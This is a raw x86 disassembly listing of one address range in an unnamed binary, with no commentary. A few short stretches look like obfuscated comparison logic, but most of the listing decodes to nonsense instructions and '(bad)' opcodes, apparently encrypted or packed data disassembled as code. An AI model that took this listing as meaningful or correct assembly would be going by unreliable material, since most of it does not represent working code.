  4039b3:	outs   dx,BYTE PTR ds:[esi]
  4039b4:	stos   DWORD PTR es:[edi],eax
  4039b5:	aad    0x31
  4039b7:	(bad)
  4039bb:	leave  
  4039bc:	jne    0x403a32
  4039be:	sahf   
  4039bf:	dec    esp
  4039c0:	inc    esi
  4039c1:	lock xor al,0xd6
  4039c4:	mov    dl,0x76
  4039c6:	inc    esp
  4039c7:	or     al,BYTE PTR ds:0xbb1f0476
  4039cd:	xlat   BYTE PTR ds:[ebx]
  4039ce:	pop    ebp
  4039cf:	pop    ecx
  4039d0:	and    DWORD PTR ds:0x75cc768d,edx
  4039d6:	dec    edx
  4039d7:	lods   al,BYTE PTR ds:[esi]
  4039d8:	jbe    0x40397e
  4039da:	jmp    0x403a35
  4039dc:	sub    DWORD PTR [esi],esp
  4039de:	stos   DWORD PTR es:[edi],eax
  4039df:	popa   
  4039e0:	mov    ebx,0x88e8e95a
  4039e5:	dec    edi
  4039e6:	cmp    al,BYTE PTR [esi-0x73fff31f]
  4039ec:	cmove  esi,DWORD PTR [esi+ebx*1]
  4039f0:	pmullw mm5,QWORD PTR ds:0x86fbeab4
  4039f7:	mov    ebx,0xe0986d0f
  4039fc:	(bad)  
  4039fd:	mov    esp,0x458b0289
  403a02:	clc    
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xf5c6e7a3
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403ab3
  403a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a5c:	adc    ecx,edx
  403a5e:	jp     0x403a2c
  403a60:	fcmovnbe st,st(7)
  403a62:	mov    ebx,DWORD PTR [ecx]
  403a64:	xor    ebp,ebp
  403a66:	(bad)  
  403a67:	mov    ds:0x616c7215,al
  403a6c:	mov    si,0x9e9c
  403a70:	adc    BYTE PTR [ebp-0x71bf5943],0x6d
  403a77:	sub    DWORD PTR [ecx],edi
  403a79:	adc    BYTE PTR [ecx+esi*1],0x41
  403a7d:	(bad)  
  403a7e:	cld    
  403a7f:	jns    0x403acb
  403a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a82:	mov    bh,0xfb
  403a84:	push   eax
  403a85:	push   eax
  403a86:	mov    dh,dh
  403a88:	xchg   BYTE PTR [eax+edi*8+0x1bca36cb],dh
  403a8f:	pop    esi
  403a90:	push   cs
  403a91:	rcr    dl,1
  403a93:	dec    ebp
  403a94:	mov    cs,esi
  403a96:	sbb    al,0x64
  403a98:	lods   eax,DWORD PTR ds:[esi]
  403a99:	stos   BYTE PTR es:[edi],al
  403a9a:	push   esp
  403a9b:	sbb    dl,BYTE PTR [esi]
  403a9d:	sar    BYTE PTR [edx-0x2a],0x67
  403aa1:	ret    
  403aa2:	rcl    DWORD PTR [edx],cl
  403aa4:	in     al,dx
  403aa5:	pop    edx
  403aa6:	(bad)  [ecx]
  403aa8:	mov    WORD PTR [eax],fs
  403aaa:	outs   dx,DWORD PTR ds:[esi]
  403aab:	loop   0x403a81
  403aad:	icebp  
  403aae:	popa   
  403aaf:	fninit 
  403ab1:	lahf   
  403ab2:	loopne 0x403b2b
  403ab4:	jmp    0x843c:0x3c57926d
  403abb:	mov    ch,0x31
  403abd:	sub    al,0x90
  403abf:	xor    ebx,DWORD PTR [ecx+edi*2]
  403ac2:	push   ds
  403ac3:	stc    
  403ac4:	mov    ch,0xa0
  403ac6:	sub    al,0x9
  403ac8:	xchg   BYTE PTR [esi+edx*2-0x524fde6d],dh
  403acf:	or     bh,dh
  403ad1:	rcl    dl,cl
  403ad3:	jo     0x403a60
  403ad5:	jle    0x403ae6
  403ad7:	ficom  DWORD PTR es:[esi+0x49]
  403adb:	jno    0x403b16
  403add:	sbb    eax,0xc6462d76
  403ae2:	out    dx,eax
  403ae3:	sbb    BYTE PTR ds:0x509c35b3,bl
  403ae9:	xchg   bh,ch
  403aeb:	(bad)  
  403aec:	loope  0x403b58
  403aee:	test   edx,ecx
  403af0:	nop
  403af1:	pusha  
  403af2:	nop
  403af3:	xchg   edi,eax
  403af4:	jl     0x403b07
  403af6:	add    al,0x19
  403af8:	mov    eax,DWORD PTR [esi]
  403afa:	adc    cl,dl
  403afc:	inc    edx
  403afd:	fnstcw WORD PTR [esi]
  403aff:	mov    edi,ebx
  403b01:	mov    al,0x25
  403b03:	xchg   esp,eax
  403b04:	xor    DWORD PTR [ebx+0x28631aa3],ecx
  403b0a:	sub    al,0x68
  403b0c:	adc    DWORD PTR ds:0x77a61f6b,0x55
  403b13:	and    eax,0xa6436a5a
  403b18:	dec    ebp
  403b19:	shl    DWORD PTR [edi],1
  403b1b:	dec    esp
  403b1c:	jl     0x403b4a
  403b1e:	imul   edi,DWORD PTR [edx],0xffffff8e
  403b21:	jbe    0x403aac
  403b23:	or     al,al
  403b25:	adc    BYTE PTR [eax+0xf],dl
  403b28:	sbb    esp,DWORD PTR [edi+edi*8+0x13b9cb65]
  403b2f:	loopne 0x403ad6
  403b31:	lea    esi,[edx]
  403b33:	pusha  
  403b34:	inc    ebp
  403b35:	aad    0x42
  403b37:	pop    edi
  403b38:	sbb    ah,bh
  403b3a:	push   0x1e63f503
  403b3f:	adc    al,0x4e
  403b41:	scas   al,BYTE PTR es:[edi]
  403b42:	pop    esi
  403b43:	lahf   
  403b44:	mov    eax,0x98ee4840
  403b49:	push   ss
  403b4a:	sbb    ecx,edi
  403b4c:	repnz push ds
  403b4e:	sub    ebx,ecx
  403b50:	adc    cl,BYTE PTR [eax]
  403b52:	pusha  
  403b53:	jmp    0xca2a:0x75ae7a0b
  403b5a:	lods   eax,DWORD PTR ds:[esi]
  403b5b:	pushf  
  403b5c:	out    dx,al
  403b5d:	inc    ebp
  403b5e:	test   DWORD PTR [ebp+0x55],0xb4e9ce3f
  403b65:	or     BYTE PTR [edi],0xc6
  403b68:	aam    0x5
  403b6a:	push   eax
  403b6b:	dec    edx
  403b6c:	aad    0xa9
  403b6e:	iret   
  403b6f:	inc    ebp
  403b70:	dec    eax
  403b71:	std    
  403b72:	rol    BYTE PTR [eax-0x7190f4f6],cl
  403b78:	xchg   edi,eax
  403b79:	push   cs
  403b7a:	push   ecx
  403b7b:	fistp  WORD PTR [edi-0xfacb27e]
  403b81:	outs   dx,DWORD PTR ds:[esi]
  403b82:	sahf   
  403b83:	and    BYTE PTR [ecx],0xc8
  403b86:	jmp    0x403c00
  403b88:	adc    BYTE PTR ds:0x5f0436f2,cl
  403b8e:	fwait
  403b8f:	inc    eax
  403b90:	xor    dl,BYTE PTR [si+0x18]
  403b94:	mov    ds:0x9adb42b4,al
  403b99:	sbb    al,0x11
  403b9b:	inc    esp
  403b9c:	mov    esp,0x81f80f89
  403ba1:	jp     0x403bb8
  403ba3:	div    eax
  403ba5:	pop    edi
  403ba6:	sti    
  403ba7:	xchg   ebx,eax
  403ba8:	(bad)  
  403ba9:	enter  0xd530,0xf2
  403bad:	scas   al,BYTE PTR es:[edi]
  403bae:	dec    ecx
  403baf:	test   eax,0xbc0621a2
  403bb4:	scas   eax,DWORD PTR es:[edi]
  403bb5:	mov    ah,0x99
  403bb7:	cmp    al,0xa2
  403bb9:	sub    esp,DWORD PTR [edx+0x6a]
  403bbc:	and    BYTE PTR [ecx],al
  403bbe:	xlat   BYTE PTR ds:[ebx]
  403bbf:	not    BYTE PTR [ecx]
  403bc1:	out    dx,al
  403bc2:	mov    ds:0x7cb063f9,eax
  403bc7:	stos   BYTE PTR es:[edi],al
  403bc8:	dec    ebp
  403bc9:	std    
  403bca:	repnz adc al,0x21
  403bcd:	dec    eax
  403bce:	call   0xf9c41b35
  403bd3:	pop    ebp
  403bd4:	shr    DWORD PTR [eax+0x4f],cl
  403bd7:	jae    0x403bd4
  403bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bda:	call   0x8b4c8f24
  403bdf:	dec    ebp
  403be0:	push   ss
  403be1:	adc    DWORD PTR [edi-0x43797fa3],eax
  403be7:	fld    TBYTE PTR [edi+0x71c9da5e]
  403bed:	jg     0x403bb0
  403bef:	in     eax,dx
  403bf0:	stos   BYTE PTR es:[edi],al
  403bf1:	(bad)  
  403bf2:	out    0x77,eax
  403bf4:	inc    edi
  403bf5:	gs cmp dl,ah
  403bf8:	adc    al,0xfe
  403bfa:	sar    BYTE PTR [edx-0x1ab33484],cl
  403c00:	cmp    esp,edx
  403c02:	int    0x69
  403c04:	jle    0x403c50
  403c06:	dec    edx
  403c07:	or     al,0x98
  403c09:	mov    ecx,0x597840f
  403c0e:	add    BYTE PTR [eax],al
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xb0dcf48b
  403c29:	pushf  
  403c2a:	fistp  QWORD PTR [ecx]
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403bfc
  403c35:	bound  edi,QWORD PTR [esi-0x48fb4e56]
  403c3b:	pop    ebp
  403c3c:	hlt    
  403c3d:	dec    esi
  403c3e:	mov    dh,0x76
  403c40:	and    ch,BYTE PTR [ebx+0x716b001b]
  403c46:	jns    0x403c75
  403c48:	and    BYTE PTR [ecx],ah
  403c4a:	sbb    DWORD PTR [eax+0x77],eax
  403c4d:	add    eax,0x5927c9e3
  403c52:	sbb    al,0x10
  403c54:	xor    eax,0x41698444
  403c59:	popf   
  403c5a:	loope  0x403c61
  403c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c5d:	push   esp
  403c5e:	xchg   esi,eax
  403c5f:	mov    edx,0xd5808db8
  403c64:	(bad)  
  403c65:	or     BYTE PTR [ebp-0x65],ch
  403c68:	(bad)  
  403c69:	push   edx
  403c6a:	jae    0x403c40
  403c6c:	dec    eax
  403c6d:	or     eax,0xfe9a6984
  403c72:	mov    eax,0x42419c33
  403c77:	cmp    edx,edx
  403c79:	aaa    
  403c7a:	cmp    esp,ecx
  403c7c:	push   esi
  403c7d:	jmp    0x403c78
  403c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c80:	bound  ecx,QWORD PTR [esp+ebx*4]
  403c83:	push   cs
  403c84:	je     0x403c92
  403c86:	loopne 0x403c93
  403c88:	popf   
  403c89:	inc    esi
  403c8a:	or     BYTE PTR [ebp+edx*2+0x47bd135b],0xda
  403c92:	jecxz  0x403cf9
  403c94:	cs pop eax
  403c96:	in     al,dx
  403c97:	hlt    
  403c98:	lahf   
  403c99:	pop    ebp
  403c9a:	mov    edx,DWORD PTR [eax+0x27]
  403c9d:	and    ebp,0x3f
  403ca0:	xor    ecx,edx
  403ca2:	pop    esi
  403ca3:	push   ds
  403ca4:	cmp    DWORD PTR [edx-0x21],eax
  403ca7:	or     BYTE PTR [edi+0x29b046ad],ah
  403cad:	xchg   ebp,eax
  403cae:	shl    BYTE PTR [edx-0x37],cl
  403cb1:	xlat   BYTE PTR ds:[ebx]
  403cb2:	inc    esi
  403cb3:	push   edi
  403cb4:	js     0x403c7b
  403cb6:	and    cl,BYTE PTR [ebx+0x66153747]
  403cbc:	sub    dh,ch
  403cbe:	dec    edi
  403cbf:	loopne 0x403c9a
  403cc1:	cmp    edi,DWORD PTR [eax+0x14]
  403cc4:	xchg   BYTE PTR [eax],dl
  403cc6:	jmp    0xc5f7:0xca97b537
  403ccd:	mov    ebx,0xf9f0664e
  403cd2:	and    bl,dh
  403cd4:	push   esi
  403cd5:	pop    ss
  403cd6:	cwde   
  403cd7:	arpl   bx,sp
  403cd9:	sub    ah,BYTE PTR [ecx-0x3fb9a7]
  403cdf:	ficom  WORD PTR [ebp+0x33]
  403ce2:	mov    ecx,DWORD PTR [edx-0x51]
  403ce5:	bound  esp,QWORD PTR [edx]
  403ce7:	pop    esp
  403ce8:	or     dh,dl
  403cea:	(bad)  
  403ceb:	adc    eax,0x17add8b1
  403cf0:	and    eax,0x3ed14a6e
  403cf5:	dec    ebp
  403cf6:	push   edi
  403cf7:	stos   DWORD PTR es:[edi],eax
  403cf8:	addr16 jno 0x403d5c
  403cfb:	dec    esi
  403cfc:	iret   
  403cfd:	out    0xa8,eax
  403cff:	mov    bl,0x19
  403d01:	jmp    0xc5ce:0x50561950
  403d08:	pop    gs
  403d0a:	test   ah,ch
  403d0c:	out    0xa3,al
  403d0e:	cli    
  403d0f:	sbb    al,0xe8
  403d11:	mov    esi,0x23af73a9
  403d16:	ret    
  403d17:	shl    BYTE PTR [esi+0x1f7e0ec4],1
  403d1d:	fwait
  403d1e:	xchg   ecx,eax
  403d1f:	repz popf 
  403d21:	out    dx,eax
  403d22:	xor    al,0x1f
  403d24:	and    ebx,DWORD PTR [edi+0x59]
  403d27:	or     bl,BYTE PTR [ebx+0xaf6f3c1]
  403d2d:	(bad)  
  403d2e:	in     al,dx
  403d2f:	stos   BYTE PTR es:[edi],al
  403d30:	push   es
  403d31:	popa   
  403d32:	pop    ebp
  403d33:	jns    0x403d57
  403d35:	cld    
  403d36:	adc    DWORD PTR [edx-0x24abe6ea],0x2d36c9f8
  403d40:	jmp    0x35789e1c
  403d45:	or     ah,dh
  403d47:	push   eax
  403d48:	hlt    
  403d49:	add    dh,BYTE PTR [esi+0x3f]
  403d4c:	mov    ds:0x21c48602,al
  403d51:	inc    esi
  403d52:	ret    
  403d53:	pop    ds
  403d54:	outs   dx,BYTE PTR ds:[esi]
  403d55:	fist   DWORD PTR [esp+eax*1-0x74871ef5]
  403d5c:	outs   dx,BYTE PTR ds:[esi]
  403d5d:	call   0xb07a90ca
  403d62:	xchg   DWORD PTR [ebx],edi
  403d64:	loope  0x403d23
  403d66:	popa   
  403d67:	add    eax,0xa4dc5d
  403d6c:	jne    0x403d9f
  403d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d6f:	rcl    BYTE PTR [edx+0x6ba99d15],1
  403d75:	int3   
  403d76:	fbld   TBYTE PTR [eax]
  403d78:	enter  0x907,0x46
  403d7c:	stos   BYTE PTR es:[edi],al
  403d7d:	fldcw  WORD PTR [edi+edi*8]
  403d80:	rol    dh,cl
  403d82:	inc    ecx
  403d83:	jne    0x403d4a
  403d85:	sub    bh,dl
  403d87:	pop    ss
  403d88:	mov    bl,0x4
  403d8a:	mov    ch,BYTE PTR [ebp+0x14]
  403d8d:	retf   0xe2fa
  403d90:	sbb    BYTE PTR [edi+ebp*1+0x49],0x3d
  403d95:	mov    ds:0xd904e7c9,eax
  403d9a:	fist   WORD PTR [ecx-0xaa319db]
  403da0:	jne    0x403e09
  403da2:	jl     0x403e04
  403da4:	mov    al,ds:0x1433c6a1
  403da9:	add    ah,BYTE PTR [edi]
  403dab:	jo     0x403e0a
  403dad:	sti    
  403dae:	loope  0x403e10
  403db0:	inc    eax
  403db1:	pop    edi
  403db2:	add    cl,BYTE PTR [ebx]
  403db4:	(bad)  
  403db5:	sub    bl,BYTE PTR [eax-0xb]
  403db8:	pop    ss
  403db9:	adc    edi,edi
  403dbb:	repnz dec ebx
  403dbd:	daa    
  403dbe:	cs jle 0x403d67
  403dc1:	scas   ax,WORD PTR es:[edi]
  403dc3:	mov    bl,0x2
  403dc5:	push   cs
  403dc6:	ds dec ebp
  403dc8:	mov    esi,DWORD PTR [ebp-0x6ffcf2f5]
  403dce:	test   DWORD PTR [edx+0x34],esi
  403dd1:	dec    edx
  403dd2:	adc    al,0x1
  403dd4:	int3   
  403dd5:	xchg   edi,eax
  403dd6:	(bad)  [eax+eiz*4-0x62]
  403dda:	mov    dh,0x6b
  403ddc:	sbb    ecx,DWORD PTR [ebx+0x4cc8c67d]
  403de2:	sbb    BYTE PTR [ebx],bh
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x1cb0d6d2],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403dae
  403e11:	jbe    0x403de7
  403e13:	sub    dh,dh
  403e15:	les    esi,FWORD PTR [esi-0x35]
  403e18:	fwait
  403e19:	xchg   DWORD PTR [edi+edi*1-0x1e904373],edx
  403e20:	sbb    DWORD PTR [ebx-0x24],esi
  403e23:	inc    edi
  403e24:	pop    eax
  403e25:	inc    esi
  403e26:	or     ch,0x6b
  403e29:	add    DWORD PTR [edx],esp
  403e2b:	(bad)  
  403e2c:	sub    esi,eax
  403e2e:	(bad)  
  403e2f:	aam    0xb0
  403e31:	mov    esi,DWORD PTR [ebx+edx*2+0x68ca290f]
  403e38:	pop    ss
  403e39:	push   edi
  403e3a:	aam    0x1a
  403e3c:	xchg   esi,eax
  403e3d:	mov    al,ds:0x4cb98a0
  403e42:	js     0x403dcc
  403e44:	xchg   BYTE PTR ds:0xefa27efc,al
  403e4a:	loopne 0x403ddf
  403e4c:	sti    
  403e4d:	add    ecx,DWORD PTR [edi]
  403e4f:	xor    ecx,DWORD PTR fs:[edx]
  403e52:	lods   eax,DWORD PTR ds:[esi]
  403e53:	xchg   ebx,eax
  403e54:	test   BYTE PTR [edi],ah
  403e56:	pop    ds
  403e57:	mov    eax,ds:0x9b0a90b2
  403e5c:	push   esp
  403e5d:	dec    ebp
  403e5e:	mov    WORD PTR [edi],cs
  403e60:	sar    DWORD PTR [ebx-0x6],1
  403e63:	push   eax
  403e64:	add    BYTE PTR [esi+ebx*2-0x75fd79b4],bh
  403e6b:	shr    BYTE PTR [ebp-0x3c802212],cl
  403e71:	mov    cl,al
  403e73:	call   0x321e811f
  403e78:	outs   dx,DWORD PTR ds:[esi]
  403e79:	enter  0xbaef,0xe
  403e7d:	add    bh,BYTE PTR [ebp-0x75]
  403e80:	out    dx,eax
  403e81:	lods   al,BYTE PTR ds:[esi]
  403e82:	fistp  WORD PTR [ebx+0x4c]
  403e85:	mov    al,ds:0xff1958fb
  403e8a:	jle    0x403e1e
  403e8c:	push   ebp
  403e8d:	xchg   esi,eax
  403e8e:	xor    al,0x63
  403e90:	cld    
  403e91:	addr16 sahf 
  403e93:	xchg   esi,eax
  403e94:	pop    edx
  403e95:	clc    
  403e96:	xchg   ebp,eax
  403e97:	std    
  403e98:	(bad)
  403e9b:	loop   0x403e7d
  403e9d:	dec    edi
  403e9e:	push   0xffffffbf
  403ea0:	mov    ebx,0x3ec6080e
  403ea5:	mov    cl,0x2
  403ea7:	adc    ch,BYTE PTR [edi-0x42]
  403eaa:	jp     0x403e4c
  403eac:	scas   eax,DWORD PTR es:[edi]
  403ead:	xor    BYTE PTR [edi+0x69952722],0x3b
  403eb4:	mov    DWORD PTR [ebx],ebp
  403eb6:	jbe    0x403f11
  403eb8:	(bad)  
  403eba:	sub    al,0x68
  403ebc:	sub    BYTE PTR [eax-0x28],bh
  403ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec0:	(bad)  
  403ec1:	pop    ebx
  403ec2:	jbe    0x403ed9
  403ec4:	mov    esp,DWORD PTR [ecx]
  403ec6:	xchg   edi,eax
  403ec7:	out    0xe1,eax
  403ec9:	xchg   esi,eax
  403eca:	test   eax,0xa864b337
  403ecf:	fbld   TBYTE PTR [edi+0x1]
  403ed2:	pop    DWORD PTR [edx]
  403ed4:	test   DWORD PTR ds:0x5d9a281c,eax
  403eda:	mov    al,0xac
  403edc:	arpl   WORD PTR [ebx],bp
  403ede:	rol    edx,cl
  403ee0:	pop    edx
  403ee1:	xlat   BYTE PTR ds:[ebx]
  403ee2:	js     0x403f4c
  403ee4:	gs jne 0x403f0f
  403ee7:	jp     0x403e6f
  403ee9:	and    dh,BYTE PTR [edi+0x7bfe6210]
  403eef:	cdq    
  403ef0:	add    esp,edx
  403ef2:	retf   
  403ef3:	stos   DWORD PTR es:[edi],eax
  403ef4:	adc    bh,BYTE PTR [ecx]
  403ef6:	cli    
  403ef7:	jns    0x403e81
  403ef9:	sub    al,0xd4
  403efb:	xlat   BYTE PTR ds:[ebx]
  403efc:	cmp    eax,0x6f8351b7
  403f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f02:	cwde   
  403f03:	mov    bh,0xc5
  403f05:	js     0x403e8c
  403f07:	icebp  
  403f08:	sub    DWORD PTR [ebx],esp
  403f0a:	xchg   DWORD PTR [esi-0x2a9c70fa],eax
  403f10:	inc    eax
  403f11:	and    DWORD PTR [ebp+ebx*4+0x73],eax
  403f15:	lea    esi,[ebx+0x32]
  403f18:	adc    al,0xdf
  403f1a:	ds and bh,0x56
  403f1e:	adc    BYTE PTR [edx],0x5d
  403f21:	or     DWORD PTR ds:[ebx],esi
  403f24:	sbb    esp,edx
  403f26:	pop    ebx
  403f27:	sahf   
  403f28:	cwde   
  403f29:	pop    esp
  403f2a:	ss fs jg 0x403f8d
  403f2e:	adc    eax,0x1640931b
  403f33:	pop    ebp
  403f34:	xchg   ecx,eax
  403f35:	out    dx,al
  403f36:	iret   
  403f37:	jae    0x403f9f
  403f39:	push   ebp
  403f3a:	mov    eax,ds:0x61e6a5ad
  403f3f:	test   eax,0x61734e92
  403f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f45:	or     BYTE PTR [ecx],dh
  403f47:	sub    al,0xba
  403f49:	out    0x8d,eax
  403f4b:	test   DWORD PTR [ebx+0x581c1507],0xa2646c08
  403f55:	jb     0x403f6f
  403f57:	xchg   esi,eax
  403f58:	push   ebp
  403f59:	dec    eax
  403f5a:	mov    ah,ch
  403f5c:	cmp    eax,0xa88762cc
  403f61:	test   al,0x92
  403f63:	xchg   BYTE PTR [ebp+0x63],dl
  403f66:	rcl    DWORD PTR [ebp-0x7],1
  403f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f6a:	sbb    BYTE PTR [ebx],ah
  403f6c:	xor    eax,0x4407449e
  403f71:	ja     0x403fdd
  403f73:	jnp    0x403fe4
  403f75:	repnz or esi,DWORD PTR [eax-0x48249969]
  403f7c:	nop
  403f7d:	and    esp,DWORD PTR [esi-0x6b775e43]
  403f83:	test   DWORD PTR ss:[edi-0x63],ecx
  403f87:	bound  edx,QWORD PTR [ecx+0x7826fe8]
  403f8d:	and    al,0x7d
  403f8f:	pop    esi
  403f90:	loope  0x403f16
  403f92:	cmp    ecx,esp
  403f94:	xor    al,0x1b
  403f96:	mov    esi,edx
  403f98:	mov    ds:0x5e1d26a0,al
  403f9d:	push   ebp
  403f9e:	in     al,dx
  403f9f:	mov    eax,0x4163ff6f
  403fa4:	or     BYTE PTR [edx+0x2a04ad14],ah
  403faa:	push   ds
  403fab:	loop   0x40400a
  403fad:	je     0x40401d
  403faf:	int3   
  403fb0:	ins    BYTE PTR es:[edi],dx
  403fb1:	arpl   bx,cx
  403fb3:	retf   
  403fb4:	pop    edi
  403fb5:	jl     0x404036
  403fb7:	pop    ecx
  403fb8:	mov    BYTE PTR [edi-0x1e],dh
  403fbb:	jle    0x403f82
  403fbd:	stc    
  403fbe:	rol    DWORD PTR [ebx+ecx*4+0x45],0xf0
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	jns    0x404004
  403fdb:	jp     0x403fce
  403fdd:	and    bl,BYTE PTR [edx]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f7b
  403fe6:	add    bh,ch
  403fe8:	enter  0x6366,0xd5
  403fec:	add    ebx,DWORD PTR [edi-0x51]
  403fef:	in     eax,0x26
  403ff1:	inc    eax
  403ff2:	sub    al,0x40
  403ff4:	push   edi
  403ff5:	mov    ds:0xba32c54f,eax
  403ffa:	fdivr  DWORD PTR [esi+ebx*4-0x5f]
  403ffe:	sub    ebx,ebp
  404000:	cmp    DWORD PTR [edx],ebp
  404002:	(bad)  
  404003:	int3   
  404004:	pop    ebp
  404005:	daa    
  404006:	out    dx,eax
  404007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404008:	mov    bh,0xdc
  40400a:	inc    ebp
  40400b:	mov    ch,0x5e
  40400e:	(bad)  [ecx]
  404010:	xor    al,0xde
  404012:	mov    ebx,0x892e4c48
  404017:	dec    ebp
  404018:	ja     0x40408e
  40401a:	mov    ds:0x564c90aa,eax
  40401f:	pop    ebx
  404020:	push   esi
  404021:	test   al,0xf2
  404023:	icebp  
  404024:	xor    BYTE PTR [edx],bh
  404026:	jnp    0x404095
  404028:	mov    eax,ds:0xc452122
  40402d:	es inc eax
  40402f:	fsubr  DWORD PTR [eax]
  404031:	push   edx
  404032:	fwait
  404033:	addr16 repz pop esp
  404036:	add    dh,BYTE PTR [edi+0x38]
  404039:	dec    edi
  40403a:	jg     0x403fdc
  40403c:	cwde   
  40403d:	cli    
  40403e:	arpl   WORD PTR [esi+0x18be7e78],cx
  404044:	enter  0xd9a6,0x47
  404048:	call   0x45265b5
  40404d:	pop    edi
  40404e:	pop    ss
  40404f:	mov    ecx,0x898e6b99
  404054:	imul   ebp,DWORD PTR [eax-0xa2e2573],0x5617be1b
  40405e:	adc    DWORD PTR [ebx+0x2e176da0],edx
  404064:	ds jge 0x4040b4
  404067:	jp     0x403ff2
  404069:	push   ds
  40406a:	pop    ecx
  40406b:	xor    BYTE PTR [edx-0x18],bh
  40406e:	cmp    eax,edx
  404070:	outs   dx,DWORD PTR ds:[esi]
  404071:	mov    edi,ecx
  404073:	imul   esi,DWORD PTR [edi-0x4e9760b9],0x55bd3c50
  40407d:	sar    BYTE PTR [esi-0xf],1
  404080:	int3   
  404081:	and    dl,BYTE PTR [edi+edi*1-0x29]
  404085:	or     eax,0xf592b2ce
  40408a:	imul   edi,ecx,0xffffffcd
  40408d:	scas   eax,DWORD PTR es:[edi]
  40408e:	ror    BYTE PTR [ecx-0x1f],cl
  404091:	xor    BYTE PTR [edi-0x31075e7e],bh
  404097:	pop    es
  404098:	cmp    BYTE PTR [ecx+0x5dcba2df],0x18
  40409f:	mov    esp,0x8b608466
  4040a4:	adc    ah,0x3d
  4040a7:	into   
  4040a8:	out    0x6,al
  4040aa:	push   ebp
  4040ab:	xor    eax,0x2e50ae8c
  4040b0:	xchg   BYTE PTR [eax-0x3b],al
  4040b3:	retf   
  4040b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b5:	mov    eax,esp
  4040b7:	or     dh,BYTE PTR [ebx+0x32b92675]
  4040bd:	sub    DWORD PTR [ecx+0x49],esp
  4040c0:	sahf   
  4040c1:	xchg   edi,ebp
  4040c3:	dec    eax
  4040c4:	xor    al,0xde
  4040c6:	add    ebx,DWORD PTR [edx+0x32cad245]
  4040cc:	std    
  4040cd:	or     BYTE PTR [edi],dh
  4040cf:	push   edx
  4040d0:	mov    ch,0x85
  4040d2:	add    esp,DWORD PTR [esi]
  4040d4:	or     DWORD PTR [ecx+0x31],edx
  4040d7:	sbb    DWORD PTR [eax-0x73949079],edi
  4040dd:	call   0xd1dbf866
  4040e2:	dec    esp
  4040e3:	idiv   BYTE PTR [ebp-0x64]
  4040e6:	out    dx,eax
  4040e7:	mov    al,0xa5
  4040e9:	rcl    BYTE PTR [eax+0x5],cl
  4040ec:	push   esi
  4040ed:	sub    al,bl
  4040ef:	adc    ah,BYTE PTR [edx-0x68c712f6]
  4040f5:	or     ch,BYTE PTR [edi-0xe]
  4040f8:	pop    ebx
  4040f9:	push   edx
  4040fa:	(bad)  
  4040fc:	dec    edi
  4040fd:	test   ecx,esp
  4040ff:	push   ss
  404100:	aaa    
  404101:	in     al,0x10
  404103:	xchg   esi,eax
  404104:	mov    ah,0xed
  404106:	int    0x9f
  404108:	sahf   
  404109:	sahf   
  40410a:	or     eax,0xa98a57b5
  40410f:	push   cs
  404110:	stos   BYTE PTR es:[edi],al
  404111:	loopne 0x404102
  404113:	sub    eax,DWORD PTR [ebx+0x4f]
  404116:	jl     0x404163
